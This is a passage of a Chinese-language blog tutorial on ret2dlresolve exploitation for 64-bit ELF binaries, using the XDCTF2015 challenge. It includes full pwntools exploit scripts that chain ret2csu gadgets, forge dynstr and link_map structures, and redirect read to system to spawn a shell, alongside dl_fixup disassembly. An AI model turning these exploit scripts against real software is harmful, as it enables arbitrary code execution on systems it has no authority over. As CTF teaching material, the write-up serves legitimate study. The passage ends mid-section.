class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">p = process(<span class="string">&quot;main_no_relro_64&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./main_no_relro_64&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400773</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x0000000000400771</span></span><br><span class="line">ret = <span class="number">0x00000000004004c6</span></span><br><span class="line">read_got = <span class="number">0x600B18</span></span><br><span class="line">gadget1 = <span class="number">0x40076A</span></span><br><span class="line">gadget2 = <span class="number">0x400750</span></span><br><span class="line">strtab = <span class="number">0x600990</span></span><br><span class="line">main = <span class="number">0x40063E</span></span><br><span class="line">data = <span class="number">0x600c00</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret2csu</span>(<span class="params">call_got_addr, rdi_val, rsi_val, rdx_val, padding=<span class="number">0x78</span>, return_after_call=<span class="number">0x0</span></span>):</span><br><span class="line">    payload = <span class="string">b&quot;A&quot;</span> * padding</span><br><span class="line">    payload += p64(gadget1)       <span class="comment"># pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)             <span class="comment"># rbx</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)             <span class="comment"># rbp</span></span><br><span class="line">    payload += p64(call_got_addr) <span class="comment"># r12 = GOT 地址</span></span><br><span class="line">    payload += p64(rdi_val)       <span class="comment"># r13 = edi</span></span><br><span class="line">    payload += p64(rsi_val)       <span class="comment"># r14 = rsi</span></span><br><span class="line">    payload += p64(rdx_val)       <span class="comment"># r15 = rdx</span></span><br><span class="line">    payload += p64(gadget2)       <span class="comment"># mov rdx, r15; mov rsi, r14; mov edi, r13; call [r12+rbx*8]</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) * <span class="number">7</span>         <span class="comment"># 对齐，模拟返回值保存现场</span></span><br><span class="line">    payload += p64(return_after_call) <span class="keyword">if</span> return_after_call <span class="keyword">else</span> <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome to XDCTF2015~!&quot;</span>,ret2csu(read_got, <span class="number">0</span>, strtab, <span class="number">8</span>, return_after_call=main))</span><br><span class="line">p.send(p64(data))		<span class="comment"># 更改DT_STRTAB</span></span><br><span class="line"></span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">dynstr = dynstr.replace(<span class="string">b&quot;read&quot;</span>,<span class="string">b&quot;system&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome to XDCTF2015~!&quot;</span>,ret2csu(read_got, <span class="number">0</span>, data, <span class="number">0x60</span>, return_after_call=main))</span><br><span class="line">p.send(dynstr)		<span class="comment"># 伪造字符表</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome to XDCTF2015~!&quot;</span>,ret2csu(read_got, <span class="number">0</span>, data+<span class="number">0x100</span>, <span class="number">8</span>, return_after_call=main))</span><br><span class="line">p.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>)			<span class="comment"># 读入字符串</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x78</span> + p64(ret) + p64(pop_rdi_ret) + p64(data+<span class="number">0x100</span>) + p64(<span class="number">0x400516</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome to XDCTF2015~!&quot;</span>,payload)		<span class="comment"># 将read函数解析成system从而获取shell</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+<h4 id="partial-relro-64">PARTIAL RELRO-64</h4>
+<h5 id="法一">法一</h5>
+<p>由于在<strong>PARTIAL
+RELRO</strong>下dynamic节不可直接改写，所以要借助其它方式来利用。首先我们重温一下<strong>dl_fixup</strong>的流程，以write调用为例，一开始我们可以发现可以定位到<strong>ELF
+JMPREL Relocation
+Table</strong>的起始位置<strong>0x400488</strong>，然后通过rdx的偏移定位到对应的<strong>Elf64_Rela</strong>表项，这里的rdx是用rsi定位出来的，而rsi正是我们plt表中第一个push的序号。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602133740717.png"
+                      class=""
+                >
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602133943320.png"
+                      class=""
+                >
+<p>其中ELF64_Rela结构体定义如下，其中sym的偏移在<strong>r_info</strong>的高4字节处，那么可以看出write的sym偏移为1，read的sym偏移为4：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr        r_offset;                <span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword        r_info;                        <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">  Elf64_Sxword        r_addend;                <span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br><span class="line"><span class="comment">/* How to extract and insert information held in the r_info field.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_SYM(i)                        ((i) &gt;&gt; 32)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_TYPE(i)                        ((i) &amp; 0xffffffff)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_INFO(sym,type)                ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span></span><br></pre></td></tr></table></figure></div>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602135216930.png"
+                      class=""
+                >
+<p>在 64 位下，Elf64_Sym 结构体为,其中Elf64_Word 32 位，Elf64_Section 16
+位，Elf64_Addr 64 位，Elf64_Xword 64 位</p>
+<p>所以，Elf64_Sym 的大小为 0x18 个字节。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word        st_name;                <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>        st_info;                <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;                <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section        st_shndx;                <span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addr        st_value;                <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xword        st_size;                <span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure></div>
+<p>由于got表还是可写的，而且程序解析函数前push进去的<strong>link_map</strong>地址也在got表上（前面的0x601008位置就是存<strong>link_map</strong>的地址，10处存**_dl_runtime_resolve<strong>函数指针）。那么我们可以直接覆盖掉这个link_map指针，并指向自己伪造一个</strong>link_map**，从而可以实现攻击目的。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602164008783.png"
+                      class=""
+                >
+<p>需要伪造的<strong>link_map</strong>结构体比较复杂，这里可以尝试结合动态调试把用到的字段填充。比如一开始这里获取symtab，根据正常运行时的结果，我们伪造<strong>link_map</strong>的偏移0x68处是一个地址A，A+0x8处存着字符表指针，那我们可以把这个位置指向我们可控的地址，其偏移8处为我们伪造的字符表；而偏移0xf8处可以直接填入<strong>0x3fe5e0</strong>（可见之前的图，理论上也可以自己伪造），复用程序的<strong>ELF
+JMPREL Relocation Table</strong>。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602165804130.png"
+                      class=""
+                >
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">dynstr = dynstr.replace(<span class="string">b&quot;read&quot;</span>,<span class="string">b&quot;system&quot;</span>)</span><br><span class="line">dynstr = dynstr.replace(<span class="string">b&quot;stdout&quot;</span>,<span class="string">b&quot;stdo&quot;</span>)</span><br><span class="line"></span><br><span class="line">fake_link_map = flat(&#123;</span><br><span class="line">    <span class="number">0x68</span>: (data+<span class="number">0x200</span>),</span><br><span class="line">    <span class="number">0xf8</span>: <span class="number">0x3fe5e0</span>,</span><br><span class="line">    <span class="number">0x208</span>: (data+<span class="number">0x210</span>),</span><br><span class="line">    <span class="number">0x210</span>: dynstr</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div>
+<p>首先用上述<strong>fake_link_map</strong>后，我们再往后执行看看，然后需要往偏移0x70处填入0x3fe570，复用正常的<strong>link_map</strong>的值。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602172122538.png"
+                      class=""
+                >
+<p>然后版本字段也需要对照正常的情况在偏移<strong>0x1c8</strong>处填入<strong>0x3fe640</strong>，但这里比较麻烦的是，正常执行过程中后面的<strong>0x2e0</strong>偏移处存的是一个libc上的地址，这个是我们不能预测的。我们只能尝试控制该地址后，在该地址+6*8偏移处手动填入<strong>0x3fe47b</strong>，并且在再高8位地址处手动填入hash码。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602172850333.png"
+                      class=""
+                >
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602173807678.png"
+                      class=""
+                >
+<p>之后来到<strong>lookup_symbols</strong>的调用，发现第四个参数也就是<strong>l-&gt;l_scope</strong>又是一个我们无法控制的值，其由<code>mov rcx, qword ptr [r10 + 0x380]</code>得到，但这个位置的值又是一个libc上的地址，我们不能预测。那么实际上这条路就被封死了，我们只能另寻他法。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602174905079.png"
+                      class=""
+                >
+<p>有了上面的基础，其实如果我们可以用write或其它输出函数泄露出原来<strong>link_map</strong>的值，那我们就可以不用自己伪造其它字段，只用更改一开始的<strong>strtab</strong>的引用即可，也就是更改0x68偏移处的内容即可。但很显然，如果可以泄露地址的话不如直接获取libc基址然后打ret2libc，更加简洁方便，我们这里其实可以用别的方法来在没有地址泄露的情况下打通。</p>
+<p>其实我们仔细看源码，就会发现前面的执行都是进了下面这个分支中找libc计算地址的，但实际程序还可以进入else分支进行计算。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment">	 address) is also known.  */</span></span><br><span class="line">    value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span><br><span class="line">    result = l;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>那我们可以构造参数从而使最后<code>byte ptr [rsi + 5]</code>处为3，这里对于read函数来说，后面靠着sym表（也就是0xf8处）得到的idx为4，那么<strong>0x7f81ca42efbb</strong>处算出的rsi就为0xc，之后只要控制<code>lea rsi, [rax + rsi*8]</code>中的rax就可以完成对rsi的控制。而且这里<code>add rbx,rax</code>得到的rbx得是got表地址，也就是说此时的rax必须为0，因为前面已经把got地址赋给了rbx。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0x7f81ca42ef86 &lt;_dl_fixup+6&gt;     lea    rdx, [rsi + rsi*2]             </span><br><span class="line">0x7f81ca42ef8a &lt;_dl_fixup+10&gt;    sub    rsp, 0x10                       </span><br><span class="line">0x7f81ca42ef8e &lt;_dl_fixup+14&gt;    mov    rax, qword ptr [rdi + 0x68]     </span><br><span class="line">0x7f81ca42ef92 &lt;_dl_fixup+18&gt;    mov    rdi, qword ptr [rax + 8]        </span><br><span class="line">0x7f81ca42ef96 &lt;_dl_fixup+22&gt;    mov    rax, qword ptr [r10 + 0xf8]     </span><br><span class="line">0x7f81ca42ef9d &lt;_dl_fixup+29&gt;    mov    rax, qword ptr [rax + 8]        </span><br><span class="line">0x7f81ca42efa1 &lt;_dl_fixup+33&gt;    lea    r8, [rax + rdx*8]              </span><br><span class="line">0x7f81ca42efa5 &lt;_dl_fixup+37&gt;    mov    rax, qword ptr [r10 + 0x70]     </span><br><span class="line">0x7f81ca42efa9 &lt;_dl_fixup+41&gt;    mov    rcx, qword ptr [r8 + 8]         </span><br><span class="line">0x7f81ca42efad &lt;_dl_fixup+45&gt;    mov    rbx, qword ptr [r8]             </span><br><span class="line">0x7f81ca42efb0 &lt;_dl_fixup+48&gt;    mov    rax, qword ptr [rax + 8]        </span><br><span class="line">0x7f81ca42efb4 &lt;_dl_fixup+52&gt;    mov    rdx, rcx                        </span><br><span class="line">0x7f81ca42efb7 &lt;_dl_fixup+55&gt;    shr    rdx, 0x20</span><br><span class="line">0x7f81ca42efbb &lt;_dl_fixup+59&gt;    lea    rsi, [rdx + rdx*2]              </span><br><span class="line">0x7f81ca42efbf &lt;_dl_fixup+63&gt;    lea    rsi, [rax + rsi*8]           </span><br><span class="line">0x7f81ca42efc3 &lt;_dl_fixup+67&gt;    mov    rax, qword ptr [r10]         </span><br><span class="line">0x7f81ca42efc6 &lt;_dl_fixup+70&gt;    mov    qword ptr [rsp + 8], rsi     </span><br><span class="line">0x7f81ca42efcb &lt;_dl_fixup+75&gt;    add    rbx, rax                     </span><br><span class="line">0x7f81ca42efce &lt;_dl_fixup+78&gt;    cmp    ecx, 7                       </span><br><span class="line">0x7f81ca42efd1 &lt;_dl_fixup+81&gt;    jne    _dl_fixup+372               &lt;_dl_fixup+372&gt;</span><br><span class="line">0x7f81ca42efd7 &lt;_dl_fixup+87&gt;    test   byte ptr [rsi + 5], 3     </span><br><span class="line">0x7f81ca42efdb &lt;_dl_fixup+91&gt;    jne    _dl_fixup+248               &lt;_dl_fixup+248&gt;</span><br></pre></td></tr></table></figure></div>
+<p>构造的<strong>fake_link_map</strong>如下：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># data为fake_link_map读取到的地址</span></span><br><span class="line">fake_link_map = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x68</span>: <span class="number">0x3fe560</span>,</span><br><span class="line">    <span class="number">0x70</span>: (data+<span class="number">0x150</span>),</span><br><span class="line">    <span class="number">0xf8</span>: <span class="number">0x3fe5e0</span>,</span><br><span class="line">    <span class="number">0x158</span>: (data+<span class="number">0x200</span>-<span class="number">0xc</span>*<span class="number">8</span>),</span><br><span class="line">    <span class="number">0x205</span>: <span class="number">3</span>,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div>
+<p>然后进入目标分支，此时<code>add rax, qword ptr [rsi + 8]</code>得到的结果最后会写回到got表中，但前面我们已经把rax改成0了，这里我们能够实现写<strong>system</strong>函数的地址到<strong>read_got</strong>，需要让<strong>rsi</strong>指向某个已经解析过的函数的got表地址-8，而且<strong>rsi+5</strong>处的值得为3，这里刚好可以发现第五个字节一般是0x7f，可以通过<code>test byte ptr [rsi + 5], 3</code>的条件。然后rax存一个相对偏移，从而可以在rax里得到<strong>system</strong>函数的地址。但我们如果把rax变成偏移，那么前面生成rbx的逻辑就得不到对应得got表地址了。不过其实这个函数解析完后，最后会直接跳转到此时解析出得函数指针处执行，如果能确保此时得rbx为一个可写的地址，也可以实现利用。所以我们还得调整rbx的值。那么实际这个偏移0xf8处的<strong>symtab</strong>也得我们自己构造。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602193718943.png"
+                      class=""
+                >
+<p>用的<strong>fake_link_map</strong>如下：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># data为fake_link_map读取到的地址</span></span><br><span class="line">offset = libc.sym[<span class="string">&quot;system&quot;</span>]-libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">fake_link_map = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: offset,</span><br><span class="line">    <span class="number">0x68</span>: <span class="number">0x3fe560</span>,         <span class="comment"># strtab</span></span><br><span class="line">    <span class="number">0x70</span>: (data+<span class="number">0x150</span>),     <span class="comment"># Relocation Table</span></span><br><span class="line">    <span class="number">0xf8</span>: (data+<span class="number">0x300</span>),     <span class="comment"># symtab</span></span><br><span class="line">    <span class="number">0x158</span>: (read_got-<span class="number">8</span>-<span class="number">0xc</span>*<span class="number">8</span>),</span><br><span class="line">    <span class="number">0x308</span>: (data+<span class="number">0x320</span>-<span class="number">9</span>*<span class="number">8</span>),</span><br><span class="line">    <span class="number">0x320</span>: (read_got-offset),</span><br><span class="line">    <span class="number">0x328</span>: (<span class="number">0x400000007</span>),</span><br><span class="line">    <span class="number">0x350</span>: <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>最后就可以把system函数地址写到<strong>read_got</strong>中，只要我们事先把rdi指向/bin/sh，然后再返回到<strong>read</strong>所对应的plt表项的第二个jump前的push。然后就可以getshell了。每个程序的函数表的布局不一样，所以根据题目的不同改0x68，0x158，0x308，0x328处的值即可。如果想要更紧凑的<strong>fake_link_map</strong>可以自行更改偏移。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602202230030.png"
+                      class=""
+                >
+<p>最终exp如下：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">p = process(<span class="string">&quot;main_partial_relro_64&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./main_partial_relro_64&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004007a3</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x00000000004007a1</span></span><br><span class="line">ret = <span class="number">0x00000000004004fe</span></span><br><span class="line">read_got = <span class="number">0x601030</span></span><br><span class="line">gadget1 = <span class="number">0x40079A</span></span><br><span class="line">gadget2 = <span class="number">0x400780</span></span><br><span class="line">link_map = <span class="number">0x601008</span></span><br><span class="line">main = <span class="number">0x40066E</span></span><br><span class="line">data = <span class="number">0x601500</span></span><br><span class="line"><span class="comment"># strtab = 0x3fe438</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret2csu</span>(<span class="params">call_got_addr, rdi_val, rsi_val, rdx_val, padding=<span class="number">0x78</span>, return_after_call=<span class="number">0x0</span></span>):</span><br><span class="line">    payload = <span class="string">b&quot;A&quot;</span> * padding</span><br><span class="line">    payload += p64(gadget1)       <span class="comment"># pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)             <span class="comment"># rbx</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)             <span class="comment"># rbp</span></span><br><span class="line">    payload += p64(call_got_addr) <span class="comment"># r12 = GOT 地址</span></span><br><span class="line">    payload += p64(rdi_val)       <span class="comment"># r13 = edi</span></span><br><span class="line">    payload += p64(rsi_val)       <span class="comment"># r14 = rsi</span></span><br><span class="line">    payload += p64(rdx_val)       <span class="comment"># r15 = rdx</span></span><br><span class="line">    payload += p64(gadget2)       <span class="comment"># mov rdx, r15; mov rsi, r14; mov edi, r13; call [r12+rbx*8]</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) * <span class="number">7</span>         <span class="comment"># 对齐，模拟返回值保存现场</span></span><br><span class="line">    payload += p64(return_after_call) <span class="keyword">if</span> return_after_call <span class="keyword">else</span> <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome to XDCTF2015~!&quot;</span>,ret2csu(read_got, <span class="number">0</span>, link_map, <span class="number">0x8</span>, return_after_call=main))</span><br><span class="line">p.send(p64(data))</span><br><span class="line"></span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">dynstr = dynstr.replace(<span class="string">b&quot;read&quot;</span>,<span class="string">b&quot;system&quot;</span>)</span><br><span class="line">dynstr = dynstr.replace(<span class="string">b&quot;stdout&quot;</span>,<span class="string">b&quot;stdo&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset = libc.sym[<span class="string">&quot;system&quot;</span>]-libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">log.info(offset)</span><br><span class="line">fake_link_map = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: offset,</span><br><span class="line">    <span class="number">0x68</span>: <span class="number">0x3fe560</span>,         <span class="comment"># strtab</span></span><br><span class="line">    <span class="number">0x70</span>: (data+<span class="number">0x150</span>),     <span class="comment"># Relocation Table</span></span><br><span class="line">    <span class="number">0xf8</span>: (data+<span class="number">0x300</span>),     <span class="comment"># symtab</span></span><br><span class="line">    <span class="number">0x158</span>: (read_got-<span class="number">8</span>-<span class="number">0xc</span>*<span class="number">8</span>),</span><br><span class="line">    <span class="number">0x308</span>: (data+<span class="number">0x320</span>-<span class="number">9</span>*<span class="number">8</span>),</span><br><span class="line">    <span class="number">0x320</span>: (read_got-offset),</span><br><span class="line">    <span class="number">0x328</span>: (<span class="number">0x400000007</span>),</span><br><span class="line">    <span class="number">0x350</span>: <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome to XDCTF2015~!&quot;</span>,ret2csu(read_got, <span class="number">0</span>, data, <span class="number">0x400</span>, return_after_call=main))</span><br><span class="line">p.send(fake_link_map)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x78</span> + p64(ret) + p64(pop_rdi_ret) + p64(data+<span class="number">0x350</span>) + p64(<span class="number">0x400546</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome to XDCTF2015~!&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+<h5 id="法二">法二</h5>
+<p>但我之后发现有字符表位于<strong>0x3fe438</strong>处好像是直接可写的，而且其地址也是固定的，那么就可以试试直接覆盖不在程序段的字符表。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602141756764.png"
+                      class=""
+                >
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602141818968.png"
+                      class=""
+                >
+<p>可惜的是最后有如下报错，那我们跟进去<strong>dl_fixup</strong>看看是具体哪里出了问题。报错说是e不是一个<strong>symbol
+system version</strong>。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
